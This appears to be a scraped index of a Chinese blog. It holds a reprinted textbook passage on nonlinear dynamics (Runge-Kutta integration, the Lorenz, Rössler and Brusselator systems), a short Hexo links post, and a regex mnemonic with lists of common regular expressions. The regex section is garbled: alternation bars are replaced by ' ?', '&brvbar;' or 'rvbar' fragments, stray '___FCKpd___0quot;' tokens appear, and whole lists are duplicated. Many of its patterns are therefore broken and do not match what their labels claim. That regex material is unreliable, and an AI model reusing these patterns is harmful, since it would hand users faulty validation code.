在欧拉型模型中，时间t和空间x都是独立变量。当时间和空间都是实的且连 续时，有偏微分方程(partial differential equations,简记PDE)，用符号表示就是 t∈R,x∈R^n，f(x,t)∈ R^m。若时间连续，空间取离散的元胞，在每个元胞内用m个函数描述演 化规律(图灵(A.M.Turing,1912-1954)称描写元胞内演化规律的方程为“生形式” (morphogens),实际上是一组常微分方程)，这种模型可叫作元胞微分模型(cellular differential models,简记为CDE)，用符号表示就是x∈R,x∈ Zn，f(x,t)∈Rm。 当时间和空间都取离散值，而函数取连续值时，我们有耦合映射(coupled maps,简记CM)， 用符号表示则为t∈Z,x∈Z^n,f(x ,t)∈R^m。最后一种是全部取离散值，对应于冯·诺伊曼和乌 拉姆发明的元胞自动机(cellular automata,简记CA)，用符号表示则为t∈Z ,x∈Zn,f(x,t)∈Zm。欧 拉型模型的任务是，如何将空间上定域性的规则与整体时空动力学模式(patterns)联系起来 。这里的“模式”指空间位形的相关性，与拉格朗日型模型中相空间变量的相关性不是一回 事。 9.2 龙格-库塔积分法 上节提到了许多模型，最基本的还是迭代(映射)和常微分方程。本章主要讲常微分方程(ODE )系统，由于通常的微分方程无法解析求解，在实际应用过程中，总是采用数值积分求解。在数值积分中，将连续过程转化为离散迭代。 我们在《常微分方程》或者《数学分析》课程中接触过一些微分方程和求解方法，但那里似 乎给出一种错误的印象：精确求解是最重要的并且总能做到。事实上正相反，在通常情况下了解微分方程的整体几何定性状况非常重要。比较几本教科书就会发现，能解的方程总是那 么几个典型例子。但愿新的教科书能够注意。 从现代数理科学发展的趋势看，理工科学生应当首先学习微分方程的几何理论(也叫定性理 论)，然后学习常系数线性微分方程精确求解方法，接着学习数值积分方法。最常用并且效 果较好的积分方法是龙格库塔积分法(Runge-Kutta integration method)。作者在北大 专门作过调查，相当一部分理工科本科生、研究生从未听说过龙格库塔数值积分法，在这 里略作介绍也是必要的。微分方程数值积分主要有三种方法：1)欧拉法(Euler method)和中点欧拉法(midpoint Euler method，也叫修正欧拉法)；2)亚当斯法(Adams method)；3)由德国的两位数学家龙 格(C.D.T.Runge,1856-1927)和库塔(M.W.Kutta,1867-1944)提出的龙格-库塔法，它的特点 是收敛速度比欧拉法快。设微分方程组(一般是非线性的)为 dx/dt=F(x,t),x∈R^m 其中x是m维向量，t代表时间，上式代表由m个方程组成的常 微分方程组。取固定时间步长t=nΔ(n=0,1,2，…)，令x n≡x(nΔ)。采用四阶龙格-库塔法积分，每一步的误 差相当于CΔ^5，其中C是与函数F有关的常数。求x的迭代关 系式为 x(n+1)=x_n+1/6(K_1+ 2K_2+2K_3+K_4)+O(Δ^5) 其中 K_1≡Δ·F(x_n,nΔ), K_2≡Δ·F［x_n+K_1/2, （n+1/2)Δ］, K_3≡Δ·F［x_n+K_2/2, （n+1/2)Δ］, K_4≡Δ·F［x_n+K_3，（n+1)Δ］. 如果是自治(autonomous)微分方程,上述的K_i(i=1,2,3,4)可以简化 为 K_1≡Δ·F(x_n), K_2≡Δ·F(x_n+K_1/2), K_3≡Δ·F(x_n+K_2/2), K_4≡Δ·F(x_n+K_3). “自治”的含义是微分方程右端不显含时间t，即方程的形状为dx/d t=F(x)。任何非自治方程都可以通过增加一维而变成自治方程。以上说的是固定积分步长的积分，它的好处是比较简单，缺点是有时不够精确。动力系统有 快流形(fast manifolds)和慢流形(slow manifolds)，在积分过程中可以采用变步长的方 法，在快流形上积分步长取得小些，在慢流形上积分步长取得大一些。比如龙格库塔法的梅森(Merson)修正方案就是一种变步长积分法。 9.3 洛仑兹混沌 洛仑兹(E.N.Lorenz,1917- )混沌吸引子已成为混沌理论的徽标，代表着复杂性新科学，好 比行星轨道图代表着哥白尼、开普勒理论一样。英国的《新科学家》杂志曾办了一个专栏， 每一期的刊头都有洛仑兹吸引子标记。在国内清华大学曾国屏(1953- )撰写的《自组织的自 然观》一书封面一共选了三幅图：道家的阴阳鱼、行星轨道图和洛仑兹混沌图，三张图分别 位于一个魔方(也可视为骰子)外显的三个面上。这种设计是很有趣的，作者试图用三幅图分 别代表三种世界图景，第一种是各国早期朴素的辩证自然观，第二种是近代科学形成的还原 论的自然观，第三种是以自组织理论、复杂性理论为标志的新型自然观。 以前科学家们不自觉地认为微分方程的解只有那么几类：1)发散轨道；2)不动点；3)极限环 ；4)极限环面(torus，复数形式为tori)。除此以外，大概没有新的运动类型了，这是人们 的一种主观猜测，谁也没有给出证明。事实上这种想法是非常错误的。1963年美国麻省理工 学院气象科学家洛仑兹给出一个具体模型，清楚地展示了一种新型运动体制：混沌运动，轨 道既不收敛到极限环上也不跑掉。 洛仑兹是学数学出身的，1948年起在MIT作动力气象学博士后工作，1963年他在《大气科学 杂志》上发表的论文《确定性非周期流》是混沌研究史上光辉的著作，无论怎样评价都不算 过分。[有关此文的发表经过可参见洛仑兹的专著《混沌的本质》(The Essense of Chaos)第四章，中译本由刘式达等翻译，气象出版社1997年出版。]而略带腼腆的洛仑 兹在回顾自己的成就时总是十分谦虚。大家应当注意的是，他在那个时代就使用了计算机， 如果不用计算机他肯定发现不了确定性非周期流，不可能就“系统长期行为不可预测”作出 判断。现在科学家使用计算机已成为一种时髦，而那时却是一种冒险。 说了半天，早该给出洛仑兹方程的具体形式了，学数理的朋友们最喜欢公式(但学文的正相 反)。洛仑兹方程极其美妙，多少年来，人们并未逃出洛仑兹方程的框架，找来找去能出现 混沌的系统总是与洛仑兹系统差不多。洛仑兹方程形式很简单，只有三个方程： dx/dt=-σ(x-y)， dy/dt=rx-y-xz， dz/dt=xy-bz， 其中σ，r，b是正的参数，这是一个自治的三阶方程组。此方程所 表示的向量场的散度 为divF=偏f_1/偏x+偏f_2/偏y+偏f_3/偏 z=-σ-1-b=-(σ+1+b)＜0. 所以洛仑兹系统是耗散的，相体积不断收缩。此方程虽然能一定程度上描述天气的复杂变化 过程，但它的真正意义并不在气象预报上!他首先是数学家，他用数学来思考问题。因而他 的模型及其从中所揭示出的新的运动体制的意义，就远远不止于气象学。 现在大家都已清楚，在二维连续系统中不可能出现混沌，三维是出现混沌所要求的最低维数 。洛仑兹模型恰好只有三维。 对于洛仑兹方程，一般是固定参数σ和b，单独考察r变化时，系统 行为的变化。当0＜r＜1时，有一个稳定不动点O(0,0,0)；当1＜r ＜r^*≡1.34561…时(对于σ=10,b=8/3)，又出现两个新的稳定不动 点A和B，这时共有3个不动点，不动点O已变为不稳定不动点。 A和B的性质总是相同的，因为方程在变换(x,y,z)→ (-x,-y,z)下是不变的。当r继续增大到r_t=σ (σ+b+3)/(σ-b-1)=24.7368…时(对于σ=10, b=8/3)，方程的3个不动点都变得不稳定了，r_t是系统行为变化的临界点， 这时就出现了洛仑兹发现的“确定性非周期流”。1963年洛仑兹研究时3个参数的取值为： σ=10,b=8/3,r=28。 这组参数值通常称标准情形(canonical case) 。当年洛仑兹就是在这一组参数值下，采用计算机数值计算，发现了奇怪吸引子。当时还没 有这一概念，直到1971年吕埃尔(D.Ruelle)和塔肯斯(F.Takens)才提出“strange attractor”一词。 洛仑兹的伟大贡献是多方面的，可以轻易举出几条： 1)为非线性动力学研究贡献了一个绝好的数学模型，值得推崇的不是此模型在多大程度上 直接反映了某个具体的物理现象，而是它抓住了复杂性的本质，为进一步深入探索各种复杂 事物奠定了坚实的基础。 2)洛仑兹有一套清晰的研究方法，《确定性非周期流》一文运用的一系列合理的“工作程序 ”，已被70年代末以来的混沌学家广泛采用。 3)定性的数学分析与计算机定量模拟相结合，开创了复杂性研究的新方法。在现在看来使 用计算机是件平常的事，但在60年代初，这是不平凡的。特别是，他识破了复杂系统中“对 初始条件的敏感依赖性”，能够正确地理解数值计算结果，显示了一位杰出科学家的洞察力 。 苏联著名学者安德罗诺夫(A.A.Andronov，1901-1952)一生“工作在相平面上”，对非线性 振动有深刻理解，但最终没有发现混沌，没有完成质的飞跃。关键性的一步似乎注定要让美 洲的另一人来迈出。 1972年美国马里兰大学的费勒(A.Feller)教授在研究气象问题时偶然发现了洛仑兹1963年 以及后来的几篇论文，他本人对洛仑兹的论文并不太感兴趣，虽然认为其中的观点很重要。 费勒把洛仑兹的4篇论文一起交给了本校的数学教授约克。李天岩后来介绍，“若不是 Feller教授，我们不太可能有机会接触到它。那段时间，我们读了洛仑兹写的文章，觉得很 有意思。”1973年4月的一天，约克告诉李天岩有一个好想法，即后来出了名的李-约克定 理(Li-Yorke theorem)，大约两周后李天岩顺利证明出了此定理。论文寄到了《美国数学月 刊》，不久被退了回来。编辑建议另投其他刊物或改得通俗一点。因为“月刊”不登专门的 研究论文。约克坚持再寄回去，可李天岩一直没有去修改它，这样该论文在李的办公桌上躺 了近一年。1974年是马里兰大学数学系的生物数学特别年，一次请普林斯顿大学赫赫有名的 生物学教授罗伯特·梅来校演讲，最后一天讲到了生物学中非常重要的逻辑斯蒂模型： f_r(x)=rx(1-x), x∈［0,1］, 0＜r＜4. 梅报告了当参数较小时此方程的迭代将导致周期倍分岔。特别地当r=4时，x 值在0和1之间跑来跑去，他无法解释这种现象，以为是计算误差造成的。约克立即意识到这 些与李-约克定理有关，在送梅上飞机时约克给梅看了那篇未发表的论文，梅大吃一惊，他 认为这个定理在很大程度上解答了他的疑问。约克从机场回来立刻跑到李天岩那里，说要马 上改写那篇文章。结果“周期三蕴含混沌”刊登在了《美国数学月刊》1975年第12期上。梅 到欧洲各处演讲，李约克定理也名扬天下，并且洛仑兹吸引子也被广为介绍，以前梅并不 知道洛仑兹的工作。 9.4若斯勒混沌 1976年若斯勒对洛仑兹模型进行再建模，化简出一个新的方程组，仍然能够产生混沌。洛仑 兹混沌吸引子是对称的，而若斯勒混沌吸引子丧失了对称性，整体结构颇像单侧曲面——麦 比乌斯(A.F.Mobius,1790-1868)带。若斯勒方程的具体形式为 dx/dt=-y-z, dy/dt=x+ay, dz/dt=b+z(x-c)，其中a,b和c都是正的参数，方程中只含有一个非线性项z x，而洛仑兹方程含有两个非线性项。从形式上看若斯勒方程的确比洛仑兹方程简单。 显然，这也是一个自治的常微分方程，右端不显含时间。先对系统作定性分析，将原系统划分为两个相互关联的子系统，第一个子系统由前两个方程 代表，第二个子系统由第三个方程代表。当z足够小时，第一个方程中的z可 以暂时忽略，这时第一个子系统可以暂时简化为 dx/dt=-y, dy/dt=x+ay, 它实际上是一个二阶线性振子，将第一个方程代入第二个方程立即得到如下微分方程： d2x/dt2-a(dx/dt)+x=0. 学过振动理论的对此方程一定是非常熟悉的，当a为正数时，它代表负阻尼振子的振 动情况。在相平面(x,y)上考虑问题，原点(0，0)是一个不稳定焦点(focus) ，轨线从原点附近向外盘旋，圈越转越大。大到一定程度，整个系统的非线性(在第三个方 程中体现出来)就必须考虑了。非线性起什么作用呢?非线性限制了轨线无限制向外盘旋。如 果没有非线性，轨线很快奔向无穷远处。非线性项的存在阻止了这一点。我们看第三个方程 ，当x大于c时，z的系数变正，取b为正值，这时第三个方程 所代表的子系统变得不稳定。非线性项起作用的结果是z值增大，而z增大的结果又会导致x减小， 因为z增大后，第一个方程中右端变小，以至于成为负值，于是x减小。x 逐步变小，以至于小于c，这样又会使z变小，相轨道逐渐落入( x,y)平面，并接近原点。这时第三个方程又是次要的了，第一个子系统 起支配作用，轨道又向外盘旋，再升高，再收缩，再降低，等等。定性上分析，轨道运动大 概就是这个样子：在(x,y)平面上拉伸，在z轴方向折叠。两个子系 统奇妙地耦合在一起(通过非线性)，子系统的稳定性交替变化，相互制约。若斯勒系统的数值积分程序与洛仑兹系统的完全一样，没必要单独写出来。不过，现在要考 虑另一件重要的事情：吸引子的任意投影。在此之前我们只能做XOY，XOZ，YOZ三个 特殊方向上的投影，而这是很不够的。在计算三维微分方程系统时，得到三维数据(x ,y,z)，任意角度投影的思想就是将这三维数据压缩成两维，并使这两 维的数据仍然包含原来三维数据的信息，也就是说想找到一种变换，使(x,y ,z)→(X_N,Y_N)，只要指定两个投影角度，就能顺利得出变换公式。设投影 角度分别是θ和φ，则投影算法为： X_N=xcosθ-ysinθ, Y_N=xsinθsinφ+ycosθsinφ+ zcosφ, Z_N=xsinθcosφ+ycosθcosφ- zsinφ. 9.5 布鲁塞尔子 从70年代末开始，在耗散结构(dissipative structures)的题目下，一个假想的三分子化学 反应动力学系统就被广泛研究了，其中比利时布鲁塞尔自由大学普里高津(I.Prigogine,191 7- )教授领导的学派为此作出巨大贡献，于是这个模型被叫做布鲁塞尔模型。进入80年代， 非线性动力学兴起，人们以混沌的眼光重新考察这个系统，加上一个三角函数策动项，得到 受迫布鲁塞尔模型，生成的混沌吸引子遂被称为布鲁塞尔子(Brusselator)。1982年郝柏林 和张淑誉(1933- )在《统计物理杂志》上著文《混沌带的层次结构》,详细讨论了布鲁塞尔 三分子系统。1983年茹克斯(J.-C.Roux)等人在《Physica 8D》上著文《奇怪吸引子的观测 》,从实际BZ反应(Belousov-Zhabotinskii reaction)数据中构造出奇怪吸引子。至此，非 线性动力学方法已深入到理论化学与应用化学中去。 在科学史上，三分子化学反应动力学模型起过重要作用，它是耗散结构理论的一个重要组成 部分。在那里人们用它来说明在开放系统中，如何通过分岔，由平衡到近平衡，再到远离平 衡，以至最后出现耗散结构。但是单纯在耗散结构的框架中，人们始终未能清楚地说明究竟 是什么起了关键性的作用。到了80年代，从非线性动力学角度看，事情才比较明朗：是非线 性起关键作用，它引起系统远离平衡，出现新结构。非但如此，非线性动力学还阐述了细节 过程，指出周期倍化分岔，周期骨架与混沌带的关系，找到了普适常数等，从而将这一特殊 的方程，纳入更一般的非线性科学的理论与方法，使之成为其中的一个特例。这段历史展示 了科学界的关注重点从非平衡到非线性的转移。 现在我们看受迫布鲁塞尔模型 dx/dt=A-(B+1)x+x^2y+α cos(ωt), dy/dt=Bx-x^2y, 其中A,B,α和ω都是参数，第一个方程最后一项α cos(ωt)表示外部周期策动(如 果去掉这一项就得到原始的布鲁塞尔模型)。这是一个非自治的二阶微分方程系统，因为右 端显含时间。它等价于一个三阶的自治微分方程系统(可化成多种形式)。本节里，我们直接 对其进行数值积分，而不是先把它化成自治系统。郝柏林的文章提到，为了提高计算速度， 应避免多次计算三角函数，于是他们通过增加变量将原方程化成四阶方程再进行计算。那时 候是80年代初，考虑计算速度是有道理的，而现在微机的速度都非常快(用486DX/80足矣!) ，根本不需要化二阶为四阶。","tags":"reprint 数学"},{"title":"hexo about","url":"/20191130/hexo-about/","text":"hexo 快速、简洁且高效的博客框架 more… 从零开始制作 Hexo 主题 hexo博客优化之next主题美化 Hexo主题开发 hexo+github搭建博客(超级详细版，精细入微)","tags":"hexo"},{"title":"正则表达式口诀及教程","url":"/20191127/zheng-ze-biao-da-shi-kou-jue-ji-jiao-cheng/","text":"正则表达式口诀及教程(推荐) 正则其实也势利，削尖头来把钱揣； （指开始符号^和结尾符号$） 特殊符号认不了，弄个倒杠来引路； （指\\. \\*等特殊符号） 倒杠后面跟小w， 数字字母来表示； （\\w跟数字字母;\\d跟数字） 倒杠后面跟小d， 只有数字来表示； 倒杠后面跟小a， 报警符号嘀一声； 倒杠后面跟小b， 单词分界或退格； 倒杠后面跟小t， 制表符号很明了； 倒杠后面跟小r， 回车符号知道了； 倒杠后面跟小s， 空格符号很重要； 小写跟罢跟大写，多得实在不得了； 倒杠后面跟大W， 字母数字靠边站； 倒杠后面跟大S， 空白也就靠边站； 倒杠后面跟大D， 数字从此靠边站； 倒框后面跟大B， 不含开头和结尾； 单个字符要重复，三个符号来帮忙； （*+ ？） 0 星加1 到无穷，问号只管0 和1； （*表0-n;+表1-n;?表0-1次重复） 花括号里学问多，重复操作能力强； （{n} {n,} {n,m}） 若要重复字符串，园括把它括起来； （（abc）{3} 表示字符串\"abc\"重复3次 ） 特殊集合自定义，中括号来帮你忙； 转义符号行不通，一个一个来排队； 实在多得排不下，横杠请来帮个忙； （[1-5]） 尖头放进中括号，反义定义威力大； （[^a]指除\"a\"外的任意字符 ） 1竖作用可不小，两边正则互替换； （键盘上与\"\\\"是同一个键） 1竖能用很多次，复杂定义很方便； 园括号，用途多； 反向引用指定组，数字排符对应它； （\"\\b(\\w+)\\b\\s+\\1\\b\"中的数字\"1\"引用前面的\"(\\w+)\"） 支持组名自定义，问号加上尖括号； （\"(?\\w+)\"中把\"\\w+\"定义为组，组名为\"Word\"） 园括号，用途多，位置指定全靠它； 问号等号字符串，定位字符串前面； （\"\\b\\w+(?=ing\\b)\"定位\"ing\"前面的字符串） 若要定位串后面，中间插个小于号； （\"(?&lt;=\\bsub)\\w+\\b\"定位\"sub\"后面的字符串） 问号加个惊叹号，后面跟串字符串； PHPer都知道， ！是取反的意思； 后面不跟这一串，统统符合来报到； （\"\\w*d(?!og)\\w*\"，\"dog\"不符合，\"do\"符合） 问号小于惊叹号，后面跟串字符串； 前面不放这一串，统统符合来报到； 点号星号很贪婪，加个问号不贪婪； 加号问号有保底，至少重复一次多； 两个问号老规矩，0次1次团团转； 花括号后跟个？，贪婪变成不贪婪； 还有很多装不下，等着以后来增加 常用正则表达式 1. ^\\d+$ //匹配非负整数（正整数 + 0） 2. ^[0-9]*[1-9][0-9]*$ //匹配正整数 3. ^((-\\d+) ?(0+))$ //匹配非正整数（负整数 + 0） 4. ^-[0-9]*[1-9][0-9]*$ //匹配负整数 5. ^-?\\d+$ //匹配整数 6. ^\\d+(\\.\\d+)?$ //匹配非负浮点数（正浮点数 + 0） 7. ^(([0-9]+\\.[0-9]*[1-9][0-9]*) ?([0-9]*[1-9][0-9]*\\.[0-9]+) ?([0-9]*[1-9][0-9]*))$ //匹配正浮点数 8. ^((-\\d+(\\.\\d+)?) ?(0+(\\.0+)?))$ //匹配非正浮点数（负浮点数 + 0） 9. ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*) ?([0-9]*[1-9][0-9]*\\.[0-9]+) ?([0-9]*[1-9][0-9]*)))$ //匹配负浮点数 10. ^(-?\\d+)(\\.\\d+)?$ //匹配浮点数 11. ^[A-Za-z]+$ //匹配由26个英文字母组成的字符串 12. ^[A-Z]+$ //匹配由26个英文字母的大写组成的字符串 13. ^[a-z]+$ //匹配由26个英文字母的小写组成的字符串 14. ^[A-Za-z0-9]+$ //匹配由数字和26个英文字母组成的字符串 15. ^\\w+$ //匹配由数字、26个英文字母或者下划线组成的字符串 16. ^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$ //匹配email地址 17. ^[a-zA-z]+://匹配(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$ //匹配url 18. 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 19. 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 20. 应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） String.prototype.len=function(){return this.replace([^\\x00-\\xff]/g,\"aa\").length;} 21. 匹配空行的正则表达式：\\n[\\s ? ]*\\r 22. 匹配HTML标记的正则表达式：/ &lt;(.*)&gt;./\\1&gt; ? &lt;(.*) \\/&gt;/ 23. 匹配首尾空格的正则表达式：(^\\s*) ?(\\s*$) 表达式用例 ^\\S+[a-z A-Z]$ 不能为空 不能有空格 只能是英文字母 \\S{6,} 不能为空 六位以上 ^\\d+$ 不能有空格 不能非数字 (.*)(\\.jpg ?\\.bmp)$ 只能是jpg和bmp格式 ^\\d{4}\\-\\d{1,2}-\\d{1,2}$ 只能是2004-10-22格式 ^0$ 至少选一项 ^0{2,}$ 至少选两项 ^[\\s ?\\S]{20,}$ 不能为空 二十字以上 ^\\+?[a-z0-9](([-+.] ?[_]+)?[a-z0-9]+)*@([a-z0-9]+(\\. ?\\-))+[a-z]{2,6}$邮件 \\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*([,;]\\s*\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*)多个地址用逗号或空格分隔邮件 ^(\\([0-9]+\\))?[0-9]{7,8}$电话号码7位或8位或前面有区号例如（022）87341628 ^[a-z A-Z 0-9 _]+@[a-z A-Z 0-9 _]+(\\.[a-z A-Z 0-9 _]+)+(\\,[a-z A-Z 0-9 _]+@[a-z A-Z 0-9 _]+(\\.[a-z A-Z 0-9 _]+)+)*$ 是字母、数字、下划线；必须有@和.同时格式要规范 邮件 ^\\w+@\\w+(\\.\\w+)+(\\,\\w+@\\w+(\\.\\w+)+)*$ 上面表达式也可以写成这样子，更精练。 ^\\w+((-\\w+) ?(\\.\\w+))*\\@\\w+((\\. &brvbar;-)\\w+)*\\.\\w+$ 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 评注：匹配中文还真是个头疼的事，有了这个表达式就好办了 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） 匹配空白行的正则表达式：\\n\\s*\\r 评注：可以用来删除空白行 匹配HTML标记的正则表达式： &lt;(\\S*?)[^&gt;]*&gt;.*? ? &lt;.*? /&gt; 评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力 匹配首尾空白字符的正则表达式：^\\ss*$ 评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式 匹配Email地址的正则表达式：\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* 评注：表单验证时很实用 匹配网址URL的正则表达式：[a-zA-z]+://[^\\s]* 评注：网上流传的版本功能很有限，上面这个基本可以满足需求 匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 评注：表单验证时很实用 匹配国内电话号码：\\d{3}-\\d{8} ?\\d{4}-\\d{7} 评注：匹配形式如 0511-4405222 或 021-87888822 匹配腾讯QQ号：[1-9][0-9]{4,} 评注：腾讯QQ号从10000开始 匹配中国邮政编码：[1-9]\\d{5}(?!\\d) 评注：中国邮政编码为6位数字 匹配身份证：\\d{15} ?\\d{18} 评注：中国的身份证为15位或18位 匹配ip地址：\\d+\\.\\d+\\.\\d+\\.\\d+ 评注：提取ip地址时有用 匹配特定数字： ^[1-9]\\d*$ //匹配正整数 ^-[1-9]\\d*$ //匹配负整数 ^-?[1-9]\\d*$ //匹配整数 ^[1-9]\\d*&brvbar;0$ //匹配非负整数（正整数 + 0） ^-[1-9]\\drvbar;0$ //匹配非正整数（负整数 + 0） ^[1-9]\\d*\\.\\drvbar;0\\.\\d*[1-9]\\d*$ //匹配正浮点数 ^-([1-9]\\d*\\.\\drvbar;0\\.\\d*[1-9]\\d*)$ //匹配负浮点数 ^-?([1-9]\\d*\\.\\drvbar;0\\.\\d*[1-9]\\drvbar;0?\\.0+ &brvbar;0)$ //匹配浮点数 ^[1-9]\\d*\\.\\drvbar;0\\.\\d*[1-9]\\drvbar;0?\\.0+ &brvbar;0$ //匹配非负浮点数（正浮点数 + 0） ^(-([1-9]\\d*\\.\\drvbar;0\\.\\d*[1-9]\\d*)) &brvbar;0?\\.0+ &brvbar;0$ //匹配非正浮点数（负浮点数 + 0） 评注：处理大量数据时有用，具体应用时注意修正 匹配特定字符串： ^[A-Za-z]+$ //匹配由26个英文字母组成的字符串 ^[A-Z]+$ //匹配由26个英文字母的大写组成的字符串 ^[a-z]+$ //匹配由26个英文字母的小写组成的字符串 ^[A-Za-z0-9]+$ //匹配由数字和26个英文字母组成的字符串 ^\\w+$ //匹配由数字、26个英文字母或者下划线组成的字符串 \"^[\\\\w-]+(\\\\.[\\\\w-]+)*@[\\\\w-]+(\\\\.[\\\\w-]+)+___FCKpd___0quot; //email地址 \"^[a-zA-z]+://(\\\\w+(-\\\\w+)*)(\\\\.(\\\\w+(-\\\\w+)*))*(\\\\?\\\\S*)?___FCKpd___0quot; //url 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 评注：匹配中文还真是个头疼的事，有了这个表达式就好办了 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） 匹配空白行的正则表达式：\\n\\s*\\r 评注：可以用来删除空白行 匹配HTML标记的正则表达式： &lt;(\\S*?)[^&gt;]*&gt;.*? ? &lt;.*? /&gt; 评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力 匹配首尾空白字符的正则表达式：^\\s*?\\s*$ 评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式 匹配Email地址的正则表达式：\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* 评注：表单验证时很实用 匹配网址URL的正则表达式：[a-zA-z]+://[^\\s]* 评注：网上流传的版本功能很有限，上面这个基本可以满足需求 匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 评注：表单验证时很实用 匹配国内电话号码：\\d{3}-\\d{8} ?\\d{4}-\\d{7} 评注：匹配形式如 0511-4405222 或 021-87888822 匹配腾讯QQ号：[1-9][0-9]{4,} 评注：腾讯QQ号从10000开始 匹配中国邮政编码：[1-9]\\d{5}(?!\\d) 评注：中国邮政编码为6位数字 匹配身份证：\\d{15} ?\\d{18} 评注：中国的身份证为15位或18位 匹配ip地址：\\d+\\.\\d+\\.\\d+\\.\\d+ 评注：提取ip地址时有用 匹配特定数字： ^[1-9]\\d*$ //匹配正整数 ^-[1-9]\\d*$ //匹配负整数 ^-?[1-9]\\d*$ //匹配整数 ^[1-9]\\drvbar;0$ //匹配非负整数（正整数 + 0） ^-[1-9]\\d*&brvbar;0$ //匹配非正整数（负整数 + 0） ^[1-9]\\d*\\.\\d*&brvbar;0\\.\\d*[1-9]\\d*$ //匹配正浮点数 ^-([1-9]\\d*\\.\\d*&brvbar;0\\.\\d*[1-9]\\d*)$ //匹配负浮点数 ^-?([1-9]\\d*\\.\\d*&brvbar;0\\.\\d*[1-9]\\d*&brvbar;0?\\.0+ &brvbar;0)$ //匹配浮点数 ^[1-9]\\d*\\.\\d*&brvbar;0\\.\\d*[1-9]\\d*&brvbar;0?\\.0+ &brvbar;0$ //匹配非负浮点数（正浮点数 + 0） ^(-([1-9]\\d*\\.\\d*&brvbar;0\\.\\d*[1-9]\\d*)) &brvbar;0?\\.0+ &brvbar;0$ //匹配非正浮点数（负浮点数 + 0） 评注：处理大量数据时有用，具体应用时注意修正 匹配特定字符串： ^[A-Za-z]+$ //匹配由26个英文字母组成的字符串 ^[A-Z]+$ //匹配由26个英文字母的大写组成的字符串 ^[a-z]+$ //匹配由26个英文字母的小写组成的字符串 ^[A-Za-z0-9]+$ //匹配由数字和26个英文字母组成的字符串 ^\\w+$ //匹配由数字、26个英文字母或者下划线组成的字符串 \"^[\\\\w-]+(\\\\.[\\\\w-]+)*@[\\\\w-]+(\\\\.[\\\\w-]+)+___FCKpd___0quot; //email地址 \"^[a-zA-z]+://(\\\\w+(-\\\\w+)*)(\\\\.(\\\\w+(-\\\\w+)*))*(\\\\?\\\\S*)?___FCKpd___0quot; //urlview plaincopy to clipboardprint? 正则几个基本概念： 1. 贪婪：+,*,?,{m,n}等默认是贪婪匹配，即尽可能多匹配，也叫最大匹配 如果后面加上?，就转化为非贪婪匹配，需要高版本支持 2. 贪婪：+,*,?,{m,n}等默认是贪婪匹配，即尽可能多匹配，也叫最大匹配 如果后面加上?，就转化为非贪婪匹配，需要高版本支持view plaincopy to clipboardprint? 3. 获取：默认用(x &brvbar;y)是获取匹配，很多时候只是测试，不一定要求得到所匹配的数据，尤其在嵌套匹配或大数据中就要用非获取匹配(?:x &brvbar;y)，这样提高了效率，优化了程序。 4. 获取：默认用(x &brvbar;y)是获取匹配，很多时候只是测试，不一定要求得到所匹配的数据，尤其在嵌套匹配或大数据中就要用非获取匹配(?:x &brvbar;y)，这样提高了效率，优化了程序。view plaincopy to clipboardprint? 5. 消耗：默认是消耗匹配，一般在预查中是非消耗匹配。 举个例子，2003-2-8要变为2003-02-08 如果用/-(\\d)-/第二次匹配将从8开始，从而只替换第一个2，错误 如果用/-(\\d)(?=-)/则第二次匹配从第二个-开始，即不消耗字符- 6. 消耗：默认是消耗匹配，一般在预查中是非消耗匹配。 举个例子，2003-2-8要变为2003-02-08 如果用/-(\\d)-/第二次匹配将从8开始，从而只替换第一个2，错误 如果用/-(\\d)(?=-)/则第二次匹配从第二个-开始，即不消耗字符-view plaincopy to clipboardprint? 7. 预查：js中分为正向预查和负向预查 如上面的(?=pattern)是正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。还有 (?!pattern)是负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。负向预查有时会用在对[^]的扩充，[^]只是一些字符，而?!可以使整个字符串。 8. 预查：js中分为正向预查和负向预查 如上面的(?=pattern)是正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。还有 (?!pattern)是负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。负向预查有时会用在对[^]的扩充，[^]只是一些字符，而?!可以使整个字符串。view plaincopy to clipboardprint? 9. 回调：一般用在替换上，即根据不用的匹配内容返回不用的替换值，从而简化了程序，需要高版本支持 10. 回调：一般用在替换上，即根据不用的匹配内容返回不用的替换值，从而简化了程序，需要高版本支持view plaincopy to clipboardprint? 11. 引用：\\num 对所获取的第num个匹配的引用。 例如，’(.)\\1\\1′ 匹配AAA型。’(.)(.)\\2\\1′ 匹配ABBA型。 12. 引用：\\num 对所获取的第num个匹配的引用。 例如，’(.)\\1\\1′ 匹配AAA型。’(.)(.)\\2\\1′ 匹配ABBA型。view plaincopy to clipboardprint? 正则表达式保留字 ^ (carat) . (period) [ (left bracket} $ (dollar sign) ( (left parenthesis) ) (right parenthesis) ? (pipe) sterisk) lus symbol) ? (question mark) { (left curly bracket, or left brace) \\ backslash 正则表达式保留字 ^ (carat) . (period) [ (left 